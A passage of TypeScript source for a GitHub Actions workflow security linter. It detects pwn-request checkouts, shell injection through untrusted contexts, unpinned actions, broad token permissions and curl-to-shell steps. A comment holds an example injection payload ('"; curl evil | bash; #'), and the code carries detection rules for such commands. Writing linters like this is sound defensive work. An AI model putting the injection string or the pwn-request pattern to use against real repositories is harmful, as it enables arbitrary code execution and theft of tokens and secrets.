        line: stepLine,
        remediation:
          'Split it into two steps: one with `uses:` for the action and one with `run:` for the command.',
      });
    } else if (usesDeclared && !hasUses) {
      add({
        id: 'step-empty-uses',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” has an empty \`uses\`.`,
        detail:
          'The step declares `uses:` but gives no action reference, so there is nothing to run.',
        line: stepLine,
        remediation:
          'Give `uses:` an action reference (`owner/repo@<sha>`, `./local-action`, or `docker://image`), or delete the key.',
      });
    } else if (!hasUses && !hasRun) {
      add({
        id: 'step-missing-action',
        severity: 'error',
        title: `Step ${idx + 1} in job “${jobId}” has neither \`uses\` nor \`run\`.`,
        detail: 'A step must either run a shell command (`run:`) or invoke an action (`uses:`).',
        line: stepLine,
        remediation: 'Add a `run:` command or a `uses:` action reference to the step.',
      });
    }
  });
}

/** Normalise a scalar-or-sequence YAML value (e.g. `needs:`) into a string list. */
function toStringList(v: unknown): string[] {
  if (typeof v === 'string') return v.trim() === '' ? [] : [v.trim()];
  if (Array.isArray(v)) {
    return v.filter((x): x is string => typeof x === 'string' && x.trim() !== '').map((x) => x.trim());
  }
  return [];
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Security checks — the differentiator.
 * ────────────────────────────────────────────────────────────────────────── */

function runSecurityChecks(
  wf: Workflow,
  lines: string[],
  jobs: JobEntry[],
  add: (f: Finding) => void,
): void {
  const triggers = collectTriggers(wf.on);
  const usesPullRequestTarget = triggers.has('pull_request_target');
  const usesPullRequest = triggers.has('pull_request');

  checkPwnRequest(usesPullRequestTarget, jobs, lines, add);
  checkScriptInjection(wf, lines, add);
  checkUnpinnedActions(jobs, lines, add);
  checkPermissions(wf, lines, add);
  checkPipeToShell(lines, add);
  checkSecretsInPullRequest(usesPullRequest || usesPullRequestTarget, lines, add);
}

/**
 * Collect the set of trigger event names from `on:`, which may be a string,
 * a list of strings, or a mapping of event → config.
 */
function collectTriggers(on: unknown): Set<string> {
  const set = new Set<string>();
  if (typeof on === 'string') {
    set.add(on);
  } else if (Array.isArray(on)) {
    for (const e of on) if (typeof e === 'string') set.add(e);
  } else if (isRecord(on)) {
    for (const k of Object.keys(on)) set.add(k);
  }
  return set;
}

/* (a) ─ pull_request_target + checkout of PR head → arbitrary code execution ─
 *
 * `pull_request_target` runs with a READ/WRITE token AND access to secrets,
 * evaluated against the BASE repo — but if the workflow then checks out the PR
 * head (`ref: ${{ github.event.pull_request.head.sha }}` / `head.ref`, or
 * `ref: refs/pull/.../merge`), it executes attacker-controlled code with that
 * privileged token. This is the canonical "pwn request" supply-chain hole.
 */
/** A checkout `ref:` that resolves to attacker-controlled PR head code. */
const UNTRUSTED_CHECKOUT_REF_RE =
  /\$\{\{\s*github\.(?:event\.pull_request\.head\.(?:sha|ref|label)|event\.pull_request\.merge_commit_sha|head_ref)\s*\}\}/i;

function isUntrustedCheckoutRef(ref: string): boolean {
  return UNTRUSTED_CHECKOUT_REF_RE.test(ref) || /refs\/pull\//i.test(ref);
}

function checkPwnRequest(
  usesPullRequestTarget: boolean,
  jobs: JobEntry[],
  lines: string[],
  add: (f: Finding) => void,
): void {
  if (!usesPullRequestTarget) return;

  // IMPORTANT: this rule reads the PARSED tree only. A raw text scan cannot
  // tell a real `ref:` from the same words inside a `#` comment (or a docstring
  // in a `run:` block), and used to raise a false ERROR on safe workflows that
  // merely *document* the pattern they are avoiding.
  let hasCheckout = false;
  let flagged = false;

  for (const { raw, line: jobLine, stepLines } of jobs) {
    if (!isRecord(raw)) continue;
    const steps = (raw as WorkflowJob).steps;
    if (!Array.isArray(steps)) continue;

    steps.forEach((rawStep, idx) => {
      if (!isRecord(rawStep)) return;
      const step = rawStep as WorkflowStep;
      // Only `actions/checkout` can place PR code on the runner's disk.
      if (!/^actions\/checkout@/i.test(asString(step.uses).trim())) return;
      hasCheckout = true;

      // Inspect ONLY this step's own `with.ref`; the default (no `ref:`) checks
      // out the BASE repo under pull_request_target, which is the safe case.
      const ref = isRecord(step.with) ? asString(step.with.ref).trim() : '';
      if (ref === '' || !isUntrustedCheckoutRef(ref)) return;

      flagged = true;
      add({
        id: 'pull-request-target-checkout',
        severity: 'error',
        title: 'pull_request_target checks out untrusted PR code.',
        detail:
          'This workflow triggers on `pull_request_target` (privileged token + secrets) and checks out the pull request head. Any fork contributor can run arbitrary code with your repository’s write token — the classic “pwn request” vulnerability.',
        line: stepLines[idx] ?? jobLine,
        remediation:
          'Do not check out PR head in `pull_request_target`. Use `pull_request` for untrusted code, or split into a privileged job (no checkout of PR code) and an unprivileged build job, and never expose secrets to checked-out PR code.',
      });
    });
  }

  if (!flagged && hasCheckout) {
    // Checkout present but we could not prove it targets the PR head — still
    // worth a warning, because the default checkout under pull_request_target
    // is the base ref (safer) but the combination is easy to make unsafe.
    add({
      id: 'pull-request-target-checkout-review',
      severity: 'warning',
      title: 'pull_request_target uses checkout — review carefully.',
      detail:
        'A `pull_request_target` workflow runs with a privileged token and secrets. Combining it with `actions/checkout` is risky: if any step builds, installs, or runs code from the PR, a fork can execute code with your write token.',
      line: findLine(lines, (l) => /pull_request_target/i.test(l)),
      remediation:
        'Confirm you never execute PR-provided code (build scripts, dependencies, makefiles) in this workflow, or move untrusted work to a separate `pull_request` workflow.',
    });
  }
}

/* (b) ─ Script injection via untrusted ${{ github.event.* }} in `run:` ────────
 *
 * GitHub expands `${{ … }}` BEFORE the shell runs. If an attacker-controlled
 * value (PR title/body, branch name, comment, …) is interpolated directly into
 * a `run:` block, the attacker can break out of the intended command and run
 * their own — e.g. a PR title of `"; curl evil | bash; #` becomes shell code.
 * We scan each `run:` block's source lines for these untrusted contexts.
 */
function checkScriptInjection(
  wf: Workflow,
  lines: string[],
  add: (f: Finding) => void,
): void {
  // Only scan lines that belong to a `run:` shell block. Interpolating an
  // untrusted context into a `with:`/`env:` INPUT (e.g. `ref: ${{ github.head_ref }}`)
  // is NOT shell injection, so scanning the whole document would false-positive.
  const RUN_RE = /^(\s*)(?:-\s*)?run:\s*(.*)$/;
  const seenLines = new Set<number>();

  const flag = (ln: number, text: string) => {
    if (seenLines.has(ln)) return;
    if (ANY_EXPRESSION_RE.test(text) && UNTRUSTED_CONTEXT_RE.test(text)) {
      seenLines.add(ln);
      add({
        id: 'script-injection',
        severity: 'warning',
        title: 'Untrusted input interpolated into a shell command.',
        detail:
          'An attacker-controlled GitHub context (such as a PR title, body, or branch name) is expanded directly inside a `run:` step. Because `${{ … }}` is substituted before the shell executes, a malicious value can inject and run arbitrary commands.',
        line: ln,
        remediation:
          'Pass the value through an environment variable instead of inline interpolation, e.g. set `env: { TITLE: ${{ github.event.pull_request.title }} }` and reference `"$TITLE"` in the script (quoted).',
      });
    }
  };

  for (let i = 0; i < lines.length; i++) {
    const m = lines[i].match(RUN_RE);
    if (!m) continue;
    const indent = m[1].length;
    const inline = m[2].trim();
    if (/^[|>]/.test(inline)) {
      // Block scalar (`run: |` / `run: >`): scan the more-indented body lines.
      for (let j = i + 1; j < lines.length; j++) {
        if (lines[j].trim() === '') continue;
        const lineIndent = lines[j].length - lines[j].replace(/^\s+/, '').length;
        if (lineIndent <= indent) break; // dedent → block ended
        flag(j + 1, lines[j]);
      }
    } else {
      // Inline `run:` command on the same line.
      flag(i + 1, lines[i]);
    }
  }
}

/* (c) ─ Unpinned third-party actions (`uses: owner/repo@vN` / `@branch`) ──────
 *
 * A tag or branch ref is MUTABLE: the owner (or an attacker who compromises the
 * action repo) can repoint `v4`/`main` at malicious code that then runs with
 * your workflow’s token. Pinning to a full commit SHA freezes the exact code.
 * First-party `actions/*` and `github/*` are lower risk (info, not warning) but
 * the same advice applies.
 */
function checkUnpinnedActions(
  jobs: JobEntry[],
  lines: string[],
  add: (f: Finding) => void,
): void {
  // Walk the PARSED steps, not the raw lines. A text scan cannot tell a real
  // `uses:` from the same word inside a `run: |` heredoc or behind a `#` — the
  // hazard this engine documents for the `ref:` scan and then fell into here.
  // Comments do not survive parsing, and a heredoc is just a string value.
  for (const entry of jobs) {
    if (!isRecord(entry.raw)) continue;
    const job = entry.raw as WorkflowJob;
    // A job-level `uses:` is a reusable-workflow call — checkReusableJob owns
    // its ref pinning, so reporting it here too would double up.
    if (asString(job.uses).trim() !== '') continue;
    const steps = job.steps;
    if (!Array.isArray(steps)) continue;

    for (let si = 0; si < steps.length; si++) {
      const step = steps[si];
      if (!isRecord(step)) continue;
      const ref = asString((step as WorkflowStep).uses).trim();
      if (ref === '') continue;

      // Skip local actions (`./path`) and Docker refs (`docker://…`) — different
      // pinning rules; SHA pinning does not apply.
      if (ref.startsWith('./') || ref.startsWith('docker://')) continue;

      const refMatch = ref.match(USES_REF_RE);
      if (!refMatch) continue; // not an owner/repo@ref form

      const owner = refMatch[1];
      const after = refMatch[3].trim();
      // Some uses include a subpath: owner/repo/path@ref — `owner` is still index 1.
      if (FULL_SHA_RE.test(after)) continue; // already pinned to a commit SHA ✓

      // Anchor on this step's own indexed line, falling back to a scoped text
      // search and then the job header.
      const line =
        entry.stepLines[si] ??
        findLine(lines, (l) => l.includes(ref) && /uses\s*:/.test(l), entry.line) ??
        entry.line;

      const firstParty = /^(actions|github)$/i.test(owner);
      add({
        id: firstParty ? 'unpinned-first-party-action' : 'unpinned-action',
        severity: firstParty ? 'info' : 'warning',
        title: firstParty
          ? `First-party action “${ref}” is pinned to a tag, not a SHA.`
          : `Third-party action “${ref}” is not pinned to a commit SHA.`,
        detail: firstParty
          ? 'This action is maintained by GitHub, so the risk is lower, but tags and branches are still mutable. Pinning to a full commit SHA guarantees the exact code you reviewed runs every time.'
          : 'This action is referenced by a mutable tag or branch (e.g. `@v4` or `@main`). The maintainer — or anyone who compromises the action — can repoint it to malicious code that runs with your workflow’s token and secrets.',
        line,
        remediation: `Pin to a full 40-character commit SHA, e.g. \`uses: ${owner}/…@<sha>\`, and add a comment with the human-readable version. Tools like Dependabot can keep the SHA up to date.`,
      });
    }
  }
}

/* (d) ─ Over-broad or implicit permissions ───────────────────────────────────
 *
 * `permissions: write-all` (or `contents: write` everywhere) grants the job
 * token far more than it needs; a compromised step or action then has broad
 * write access. With NO top-level `permissions:`, the token defaults to the
 * repository/org setting — historically read/write — which is broader than the
 * least-privilege default of read-only. Recommend declaring least privilege.
 */
function checkPermissions(
  wf: Workflow,
  lines: string[],
  add: (f: Finding) => void,
): void {
  const topPerms = wf.permissions;

  const isWriteAll = (p: unknown): boolean =>
    p === 'write-all' || (typeof p === 'string' && p.trim().toLowerCase() === 'write-all');

  if (isWriteAll(topPerms)) {
    add({
      id: 'permissions-write-all',
      severity: 'warning',
      title: 'Top-level `permissions: write-all` is over-broad.',
      detail:
        '`write-all` grants the GITHUB_TOKEN write access to every scope (contents, packages, deployments, …). A single compromised step or action then inherits all of it.',
      line: findLine(lines, (l) => /permissions:\s*write-all/i.test(l)),
      remediation:
        'Declare only the scopes you need, e.g. `permissions: { contents: read }`, and elevate per-job where a specific write is required.',
    });
  } else if (topPerms === undefined || topPerms === null) {
    // No top-level permissions — check whether jobs declare their own; if none
    // do, the default token scope applies and we recommend an explicit default.
    let anyJobDeclares = false;
    if (isRecord(wf.jobs)) {
      for (const job of Object.values(wf.jobs as Record<string, unknown>)) {
        if (isRecord(job) && (job as WorkflowJob).permissions !== undefined) {
          anyJobDeclares = true;
        }
        // A job that sets write-all is also worth flagging.
        if (isRecord(job) && isWriteAll((job as WorkflowJob).permissions)) {
          anyJobDeclares = true;
        }
      }
    }
    if (!anyJobDeclares) {
      add({
        id: 'permissions-missing',
        severity: 'warning',
        title: 'No top-level `permissions:` — token defaults are broad.',
        detail:
          'Without an explicit `permissions:` block, the GITHUB_TOKEN inherits the repository/organization default, which can be read/write. Declaring least privilege limits the blast radius if a step is compromised.',
        line: 1,
        remediation:
          'Add a top-level `permissions: { contents: read }` (or `permissions: read-all`) and grant additional scopes only to the jobs that need them.',
      });
    }
  }

  // Also flag any job that opts into write-all even when the top level is fine.
  if (isRecord(wf.jobs)) {
    for (const [jobId, job] of Object.entries(wf.jobs as Record<string, unknown>)) {
      if (isRecord(job) && isWriteAll((job as WorkflowJob).permissions)) {
        add({
          id: 'job-permissions-write-all',
          severity: 'warning',
          title: `Job “${jobId}” requests \`permissions: write-all\`.`,
          detail:
            'This job grants its token write access to every scope. Scope it down to only what the job needs.',
          line: findLine(lines, (l) => /permissions:\s*write-all/i.test(l)),
          remediation: 'Replace `write-all` with the specific scopes the job requires.',
        });
      }
    }
  }

  // Enumerated scopes: names, values, and "write-all with extra steps".
  checkPermissionsMap(topPerms, 'the workflow', lines, 1, add);
  if (isRecord(wf.jobs)) {
    for (const [jobId, job] of Object.entries(wf.jobs as Record<string, unknown>)) {
      if (!isRecord(job)) continue;
      checkPermissionsMap(
        (job as WorkflowJob).permissions,
        `job “${jobId}”`,
        lines,
        findLine(lines, (l) => new RegExp(`^\\s*${escapeRegExp(jobId)}\\s*:`).test(l)),
        add,
      );
    }
  }

  // Partial coverage. The block above only nudges when NO job declares
  // permissions, so a single `permissions: {}` job used to buy silence for
  // every other job in the file. Name the jobs that are actually uncovered.
  const topDeclared = topPerms !== undefined && topPerms !== null;
  if (!topDeclared && isRecord(wf.jobs)) {
    const entries = Object.entries(wf.jobs as Record<string, unknown>);
    const someDeclare = entries.some(
      ([, j]) => isRecord(j) && (j as WorkflowJob).permissions !== undefined,
    );
    if (someDeclare) {
      for (const [jobId, job] of entries) {
        if (!isRecord(job) || (job as WorkflowJob).permissions !== undefined) continue;
        // Only nudge jobs that actually use the token — a pure-echo job
        // inherits a scope it never reads, and nagging about it is noise.
        if (!usesToken(job)) continue;
        add({
          id: 'job-missing-permissions',
          severity: 'info',
          title: `Job “${jobId}” has no \`permissions:\` while other jobs in this file do.`,
          detail:
            'With no top-level `permissions:` block, this job falls back to the repository default — which is often broader than the jobs that DID declare their own. Mixed coverage like this is usually an oversight rather than a decision.',
          line: findLine(lines, (l) => new RegExp(`^\\s*${escapeRegExp(jobId)}\\s*:`).test(l)),
          remediation:
            'Give this job its own `permissions:` block, or add a top-level `permissions: { contents: read }` so every job starts from least privilege.',
        });
      }
    }
  }
}

/** Every scope name GitHub accepts under `permissions:` (verified 2026-08). */
const PERMISSION_SCOPES = [
  'actions',
  'attestations',
  'checks',
  'contents',
  'deployments',
  'discussions',
  'id-token',
  'issues',
  'models',
  'packages',
  'pages',
  'pull-requests',
  'repository-projects',
  'security-events',
  'statuses',
] as const;

const PERMISSION_VALUES = new Set(['read', 'write', 'none']);

/** Enumerated write scopes at or above this count read as write-all. */
const BROAD_WRITE_THRESHOLD = 3;

/** Nearest valid scope to a typo, by prefix overlap then length similarity. */
function nearestScope(name: string): string | undefined {
  const lower = name.toLowerCase();
  let best: string | undefined;
  let bestScore = 0;
  for (const scope of PERMISSION_SCOPES) {
    let common = 0;
    while (common < lower.length && common < scope.length && lower[common] === scope[common]) {
      common += 1;
    }
    // Require a real prefix overlap so unrelated names get no suggestion.
    const score = common - Math.abs(scope.length - lower.length) * 0.1;
    if (common >= 3 && score > bestScore) {
      bestScore = score;
      best = scope;
    }
  }
  return best;
}

/**
 * Validate one `permissions:` mapping — scope names, scope values, and the
 * enumerated-write-everything case. `isWriteAll` only ever matched the literal
 * string `write-all`, so the shape people actually ship (four or five scopes
 * each set to `write`) was invisible.
 */
function checkPermissionsMap(
  perms: unknown,
  where: string,
  lines: string[],
  line: number | undefined,
  add: (f: Finding) => void,
): void {
  if (!isRecord(perms)) return;

  let writeCount = 0;
  for (const [scope, value] of Object.entries(perms)) {
    const known = (PERMISSION_SCOPES as readonly string[]).includes(scope);
    if (!known) {
      const suggestion = nearestScope(scope);
      add({
        id: 'permissions-unknown-scope',
        severity: 'error',
        title: `“${scope}” is not a GitHub Actions permission scope.`,
        detail: `GitHub rejects a workflow with an unrecognised key under \`permissions:\`, so ${where} will not run at all.`,
        line: findLine(lines, (l) => new RegExp(`^\\s*${escapeRegExp(scope)}\\s*:`).test(l), line),
        remediation: suggestion
          ? `Did you mean \`${suggestion}\`?`
          : `Valid scopes are: ${PERMISSION_SCOPES.join(', ')}.`,
      });
      continue;
    }
    if (typeof value !== 'string' || !PERMISSION_VALUES.has(value.trim().toLowerCase())) {
      add({
        id: 'permissions-unknown-scope',
        severity: 'error',
        title: `\`${scope}: ${String(value)}\` is not a valid permission level.`,
        detail: 'Each scope must be `read`, `write`, or `none`.',
        line: findLine(lines, (l) => new RegExp(`^\\s*${escapeRegExp(scope)}\\s*:`).test(l), line),
        remediation: `Set \`${scope}:\` to read, write, or none.`,
      });
      continue;
    }
    if (value.trim().toLowerCase() === 'write') writeCount += 1;
  }

  if (writeCount >= BROAD_WRITE_THRESHOLD) {
    add({
      id: 'permissions-broad-write',
      severity: 'warning',
      title: `${writeCount} write scopes granted to ${where} — that is write-all with extra steps.`,
      detail:
        'Granting most scopes write access gives a compromised step or action nearly the same reach as `write-all`, while looking deliberate.',
      line,
      remediation:
        'Keep only what the job provably uses. The common legitimate pairs are `contents: write` for a release and `id-token: write` for OIDC — very few jobs need more than two.',
    });
  }
}

/** Does this job plausibly use the GITHUB_TOKEN? Drives the coverage nudge. */
function usesToken(job: unknown): boolean {
  if (!isRecord(job)) return false;
  const steps = (job as WorkflowJob).steps;
  if (Array.isArray(steps)) {
    for (const step of steps) {
      if (isRecord(step) && asString((step as WorkflowStep).uses).trim() !== '') return true;
    }
  }
  return /secrets\.GITHUB_TOKEN|github\.token/i.test(JSON.stringify(job));
}

/* (e) ─ `curl … | bash` / `wget … | sh` in run steps ─────────────────────────
 *
 * Piping a network download straight into a shell runs whatever the server
 * returns — there is no review, no checksum, and a compromised or MITM’d host
 * executes arbitrary code in your runner with its token and secrets.
 */
function checkPipeToShell(lines: string[], add: (f: Finding) => void): void {
  for (let i = 0; i < lines.length; i++) {
    if (PIPE_TO_SHELL_RE.test(lines[i])) {
      add({
        id: 'pipe-to-shell',
        severity: 'warning',
        title: 'Piping a network download directly into a shell.',
        detail:
          'A `curl … | bash` / `wget … | sh` pattern executes whatever the remote server returns, with no integrity check. A compromised host, hijacked domain, or MITM lets an attacker run arbitrary code on the runner.',
        line: i + 1,
        remediation:
          'Download to a file, verify a checksum/signature, then execute — or install via a pinned, trusted action or package manager instead.',
      });
    }
  }
}

/* (f) ─ secrets.* used in pull_request-triggered workflows (INFO) ─────────────
 *
 * `pull_request` from a fork does NOT expose repository secrets by default
 * (a safety measure), so referencing `secrets.*` in such a workflow either does
 * nothing useful for forks or — if it’s actually `pull_request_target` — runs
 * with secrets against untrusted code. Flag as info so the author confirms intent.
 */
function checkSecretsInPullRequest(
  prTriggered: boolean,
  lines: string[],
  add: (f: Finding) => void,
): void {
  if (!prTriggered) return;
  const line = findLine(lines, (l) => /\$\{\{\s*secrets\./i.test(l));
  if (line !== undefined) {
    add({
      id: 'secrets-in-pull-request',
      severity: 'info',
      title: 'Secrets referenced in a pull_request-triggered workflow.',
      detail:
        'Workflows triggered by `pull_request` from a fork do not receive repository secrets by default. If this runs as `pull_request_target`, the secrets ARE available to untrusted PR code — make sure that is intended.',
      line,
      remediation:
        'Confirm whether forks need these secrets. Prefer running secret-dependent steps on a trusted event (push, workflow_run) rather than untrusted PRs.',
    });
  }
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Finalize — sort by severity, de-duplicate, and roll up counts.
 * ────────────────────────────────────────────────────────────────────────── */

const SEVERITY_ORDER: Record<Severity, number> = { error: 0, warning: 1, info: 2 };

function finalize(findings: Finding[]): ValidateResult {
  // De-duplicate identical findings that two passes might both emit. The TITLE
  // is part of the key: distinct problems can legitimately share a rule id and
  // a line (or an unresolved line), and collapsing them hid real findings.
  const seen = new Set<string>();
  const deduped: Finding[] = [];
  for (const f of findings) {
    const key = `${f.id}@${f.line ?? '-'}@${f.title}`;
    if (seen.has(key)) continue;
    seen.add(key);
    deduped.push(f);
  }

  // Stable sort: severity first, then by line number (undefined lines last).
  deduped.sort((a, b) => {
    const s = SEVERITY_ORDER[a.severity] - SEVERITY_ORDER[b.severity];
    if (s !== 0) return s;
    const al = a.line ?? Number.MAX_SAFE_INTEGER;
    const bl = b.line ?? Number.MAX_SAFE_INTEGER;
    return al - bl;
  });

  const summary = {
    errors: deduped.filter((f) => f.severity === 'error').length,
    warnings: deduped.filter((f) => f.severity === 'warning').length,
    infos: deduped.filter((f) => f.severity === 'info').length,
  };

  return { ok: true, findings: deduped, summary };
}
